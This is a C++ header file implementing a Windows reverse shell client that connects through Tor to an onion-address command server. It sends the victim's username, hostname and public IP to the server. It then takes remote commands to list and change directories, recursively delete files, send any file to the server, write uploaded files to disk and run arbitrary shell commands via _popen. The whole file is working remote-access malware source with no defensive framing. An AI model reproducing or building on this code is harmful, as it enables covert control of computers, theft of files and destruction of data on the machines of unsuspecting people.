#pragma once

#include "TorPlusPlus/torplusplus.hpp"

#include <string>
#include <Windows.h>
#include <lmcons.h>
#include <filesystem>
#include <vector>
#include <iterator>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib")
#include <WinSock2.h>


/*
    Contains code for connecting to the server and processing commands
*/
class torRevShellClient {
private:
    torPlusPlus::torSocketExtended torSock;
    std::string torPath;
    std::string servAddr;
    unsigned int servPort = 0;
    std::string publicIp;
    std::string username;
    std::string hostname;
    bool connected = false;

    /*
        Get the public IP address to send to the server by making a GET request to checkip.amazonaws.com
        Obviously, this cant be done using TOR, so a normal socket is created.
        !!! There is a lack of error handling in this function
    */
    std::string getPublicIP() {
        std::string url = "checkip.amazonaws.com"; // The URL to ask nicely for our IP
        
        // Start winsocket crap
        WSADATA wsaData = { 0 };
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        // Set up the host, address, and socket:
        struct hostent* host = gethostbyname(url.c_str());
        struct sockaddr_in addr;
        addr.sin_addr.s_addr = *(u_long*)host->h_addr_list[0];
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        // Connect to the server and send the GET request
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        std::string req = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n";
        send(sock, req.c_str(), req.length(), 0);
        
        // Receive the response
        char buffer[1024];
        int bytesReceived = recv(sock, buffer, 1024, 0);
        
        // Clean up the socket
        closesocket(sock);
        WSACleanup();
        
        // Get the IP from the response (Hopefully its there!)
        std::string response(buffer, bytesReceived-1); //-1 removes last newline
        return response.substr(response.find_last_of('\n') + 1); // The IP is at the end of the response, after a newline.
    }

    
    /*
        Gets username, hostname, and public IP (via checkip.amazonaws.com)
        Stores them in the class variables to send to the server (for identification)
    */
    void getComputerInfo() {
        // Get the username of the current user:
        TCHAR usernameTC[UNLEN + 1]; // UNLEN is defined in Lmcons.h as 256 (maximum username length, apparently)
        DWORD usernameLen = UNLEN + 1;
        GetUserName(usernameTC, &usernameLen);
        std::wstring usernameWStr(&usernameTC[0]);
        this->username = std::string(usernameWStr.begin(), usernameWStr.end());
        
        // Get the computer hostname:
        DWORD hostnameLen = 16; // GetComputerName returns the NetBIOS name, which is 15 characters long (max)
        TCHAR hostnameTC[16]; // TCHAR is a dumb type and windows is silly >:(
        GetComputerName(hostnameTC, &hostnameLen); // Put the NetBIOS name into the hostnameTC buffer
        std::wstring hostnameWStr(&hostnameTC[0]); // Convert to a wstring, so it can then be converted into an std::string
        this->hostname = std::string(hostnameWStr.begin(), hostnameWStr.end()); // Convert to std::string and store in this->hostname

        // Get the public IP address:
        this->publicIp = this->getPublicIP(); // In its own function since it requires a bit more code than the above two
    }

    
public:
    /*
        Sets up some important variables.
        torPath: the path to tor.exe on disk.
        servAddr: the onion address of the server to connect to.
        Calls this->getComputerInfo() to get the username, hostname, and public IP of this computer.
    */
    torRevShellClient(std::string torPath, std::string servAddr, unsigned int servPort){
        this->torPath = torPath;
        this->servAddr = servAddr;
        this->servPort = servPort;
        this->getComputerInfo();
    }

    
    /*
        Attempts to start TOR using this->torPath.
        Does not connect to the proxy!
        Returns 0 on fail
    */
    bool startProxy() {
        return this->torSock.startTorProxy(this->torPath.c_str());
    }

    
    /*
        Attempts to make a connection to the server
        Returns true if a successful response from server is received ("<ip>;<username>;<hostname>;connected;")
    */
    bool attemptConnect() {
        // Start the proxy and connect to the server
        this->torSock.connectToProxy(); // Connect to the proxy, so we can then connect to the server through it
        printf("Attempting to connect to %s:%d\n", this->servAddr.c_str(), this->servPort);
        this->torSock.connectProxyTo(this->servAddr.c_str(), this->servPort);
        
        // Assemble and send the connection request
        std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";"; // Format: <ip>;<username>;<hostname>;
        this->torSock.proxySend(connReq.c_str(), connReq.size());
        
        // Receive the response from the server
        char connResponseBuff[1024] = { 0 }; // 1kb is more than enough
        this->torSock.proxyRecv(connResponseBuff, 1024);
        printf("Received response: %s\n", connResponseBuff);
        
        // Process the response from the server
        std::string connResponse = connResponseBuff; // Convert to std::string for easier handling
        this->connected = (connResponse == this->publicIp + ";" + this->username + ";" + this->hostname + ";" + "connected;"); // Verify that the data the server sent back matches what we sent
        return this->connected;
    }
    
    
    /*
        This is essentially the "main()" for the server.
        Only runs if this->connected is true.
    */
    void cmdProcessLoop() {
        if (!this->connected) { // Return immediately if not connected to the server
            return;
        }
        while (1) {
            char cmdBuff[1024] = { 0 }; // !! hard limits on command length arent epic
            int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
            if (bytesReceived <= 0) { // If receiving fails, assume the connection was lost and exit the loop
                return;
            }
            std::string cmd = cmdBuff; // Convert for easier handling
            if (cmd == "ping;") {
                torSock.proxySend("ping;pong;", 11); // This is used by the server to check if the client is still connected and responsive
            }
            else if (cmd == "pwd;") { // Print Working Directory
                this->pwd();
            }
            else if (cmd == "ls;") { // LiSt files (and folders) in current directory
                this->ls();
            }
            else if (cmd.starts_with("cd;")) { // Change Directory
                this->cd(cmd.substr(3, cmd.size() - 4));
            }
            else if (cmd.starts_with("rm;")) {
                this->rm(cmd.substr(3, cmd.size() - 4));
            }
            else if (cmd.starts_with("mkdir;")) {
                this->mkdir(cmd.substr(6, cmd.size() - 7));
            }
            else if (cmd.starts_with("grab;")) { // Uploads a file to the server
                this->grab(cmd.substr(5, cmd.size() - 6));
            }
            else if (cmd.starts_with("upload;")) {
                this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
            }
            else if (cmd.starts_with("exec;")) { // Executes a command via _popen()
                this->exec(cmd.substr(5, cmd.size() - 6));
            }
            else {
                // If the command is unknown to the client, return an error message to the server
                std::string failResponse = "Received invalid command: " + cmd;
                torSock.proxySendStr(failResponse);
            }
        }
    }

    /*
        ================ All the functions below this line are called by cmdProcessLoop() ================
    */
    
    
    /*
        Sends the current working directory to the server
        Response format: "pwd;<path>;"
    */
    void pwd() {
        // Get the current working directory
        TCHAR cwdTC[MAX_PATH] = { 0 }; // MAX_PATH is defined in Windef.h as 260
        GetCurrentDirectory(MAX_PATH, cwdTC); // Put the current working directory into cwdTC
        std::wstring cwdWStr(&cwdTC[0]); // Convert to a wstring so it can be converted to a normal string
        this->torSock.proxySendStr("pwd;" + std::string(cwdWStr.begin(), cwdWStr.end()) + ";"); // Send the response to the server
    }

    /*
        Sends a list of files and folders in the current working directory to the server
        Response format: "ls;<response size>;<file1>;<file2>;<file3>;..."
        Folders have "/" appended to the end of their name
    */
    void ls() {
        std::string response;
        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) { // For every entry in an iterator of files in the current directory
            response += entry.path().filename().string(); // Add the filename to the response
            if (entry.is_directory()) { // If the entry is a directory, append a "/" to the end of the filename
                response += "/";
            }
            response += ";"; // Add a semicolon to the end of the filename to separate it from the next one
        }
        this->torSock.proxySendStr("ls;" + std::to_string(response.size()) + ";" + response);
    }

    /*
        Changes the current working directory of this executable to the one specified in the command
    */
    void cd(std::string path){
        std::wstring pathWStr(path.begin(), path.end()); // Convert to a wstring because windows is cringe
        BOOL success = SetCurrentDirectory(pathWStr.c_str()); // Attempt to change the current working directory
        this->torSock.proxySendStr("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
    }

    /*
        rm() calls std::filesystem::remove_all.
        Will delete recursively, use with care!
    */
    void rm(std::string path) {
        std::string pathReal = path; // If adjustments are required, we dont modify the original path (the server expects to get exactly the same path it sent as the response)
        if (std::filesystem::is_directory(pathReal) && pathReal.back() != '\\') {
            pathReal += "\\";
        }
        this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(pathReal)) ? ";success;" : ";failed;"));
    }

    void mkdir(std::string path) {
        this->torSock.proxySendStr("mkdir;" + path + ((std::filesystem::create_directories(path)) ? "/;success;" : ";failed;"));
    }

    /*
        grab() is used by the server to retreive a file at the given path from the client
        Response format: "grab;<path>;<file size>;<raw file data>"
    */
    void grab(std::string path) {
        std::ifstream f(path.c_str(), std::ios::binary); // Open the file in binary mode
        if (f.is_open() != true) {
            this->torSock.proxySendStr("grab;" + path + ";0;ERR"); // If the file could not be opened, send an error message to the server
        }
        else {
            std::string responseStr = "grab;" + path + ";" + std::to_string(std::filesystem::file_size(path)) + ";"; // Assemble the plaintext part of the response
            std::vector<char> responseBytes; // Create a vector to store the raw bytes of the response (cant use an std::string because it cant store null bytes)
            responseBytes.reserve(responseStr.size() + std::filesystem::file_size(path)); // Reserve enough space for the plaintext part of the response and the file data (slight performance boost maybe)
            responseBytes.insert(responseBytes.end(), responseStr.begin(), responseStr.end()); // Insert the plaintext part of the response into the vector
            // The following loop probably isnt very speedy due to calling push_back() a lot, but it works. (the speed of the TOR network is a much more significant bottleneck, so this is fine)
            for (char c; f.get(c);) {
                responseBytes.push_back(c);
            }
            this->torSock.proxySend(responseBytes.data(), responseBytes.size()); // Send the bytes to the server
        }
    }

    /*
        upload() is used by the server to place a file onto the client
        Request format: "upload;<file name>;<file size>;<raw file data>"
        Response format: "upload;<file name>;<success/failed>"
    */
    void upload(char* b, unsigned int bytesReceivedInitial) {
        // Read the plaintext header containing the file name and size
        std::string bStr(b);
        int fileNameEnd = bStr.find(";", 7); // The index of the end of the filename is at the first ";" after "upload;"
        std::string fileName = bStr.substr(7, fileNameEnd - 7);
        unsigned long int fileSize = std::stoi(bStr.substr(fileNameEnd + 1, bStr.find(";", fileNameEnd + 1) - fileNameEnd - 1)); // An unsafe way of parsing the fileSize from the request
        unsigned int headerSize = 7 + fileName.size() + 1 + std::to_string(fileSize).size() + 1; // 7 = "upload;", 1 = ";", 1 = ";"
        
        // Read the binary file data from the server
        std::vector<char> fileData;
        fileData.reserve(fileSize); // Reserve enough space for the whole file in the std::vector
        unsigned bytesReceivedTotal = bytesReceivedInitial - headerSize; // Store the number of bytes of data received so far (in the first 1024 bytes that was read by cmdProcessLoop())
        printf("Received upload for %d bytes of data, filename: %s\n", fileSize, fileName.c_str());
        fileData.insert(fileData.end(), b + headerSize, b + bytesReceivedInitial); // Insert the first chunk of bytes into the fileData vector
        while (bytesReceivedTotal < fileSize) { // While we havent received the entire file, keep reading from the socket and pushing data back onto fileData
            char b[1024] = { 0 };
            unsigned int bytesReceived = this->torSock.proxyRecv(b, 1024);
            fileData.insert(fileData.end(), b, b + bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }

        // Write the data to the disk
        std::ofstream f(fileName.c_str(), std::ios::binary); // Open a file with the fileName sent by the server in binary mode
        if (f.is_open() != true) { // If opening the file failed for whatever reason, send a failure message back to the server
            this->torSock.proxySendStr("upload;" + fileName + ";failed;");
        }
        else {
            f.write(fileData.data(), fileData.size()); // Slap that data onto the disk
            this->torSock.proxySendStr("upload;" + fileName + ";success;"); // Send a success message back to the server
        }
        f.close();
    }

    /*
        Executes the given cmd via _popen()
    */
    void exec(std::string cmd) {
        std::string response;
        FILE* pipe = _popen(cmd.c_str(), "r"); // The FILE* can be used to retreive the output of the command
        if (!pipe) {
            response += "failed;";
        }
        else {
            // Read from the pipe 128 bytes at a time until theres nothing left. Add everything onto the response string
            char buffer[128];
            while (!feof(pipe)) {
                if (fgets(buffer, 128, pipe) != NULL) {
                    response += buffer;
                }
            }
            _pclose(pipe);
        }
        if (response.size() == 0) {
            this->torSock.proxySendStr("exec;" + cmd + ";0;;");
        }
        this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
    }
    
};